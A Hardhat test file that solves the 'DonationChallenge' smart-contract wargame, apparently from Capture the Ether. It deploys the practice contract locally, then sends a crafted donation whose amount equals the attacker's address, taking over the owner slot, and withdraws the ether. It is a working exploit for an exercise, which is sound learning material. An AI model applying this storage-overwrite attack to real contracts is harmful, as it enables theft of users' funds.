import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, BigNumber } = ethers;

describe('DonationChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('DonationChallenge');
    target = await targetFactory.deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const scale = BigNumber.from(10).pow(18).mul(utils.parseEther('1'));
    const attackerAddressNumber = BigNumber.from(attacker.address);
    const etherToSend = attackerAddressNumber.div(scale);
    console.log(BigNumber.from(attacker.address).toString());
    console.log(scale.toString());
    console.log(etherToSend.toString());
    console.log(utils.formatEther(etherToSend));

    let tx;

    console.log('1 - Donating');
    tx = await target.connect(attacker).donate(attackerAddressNumber, {
      value: etherToSend,
    });
    await tx.wait();

    console.log('2 - Withdrawing');
    tx = await target.connect(attacker).withdraw();
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
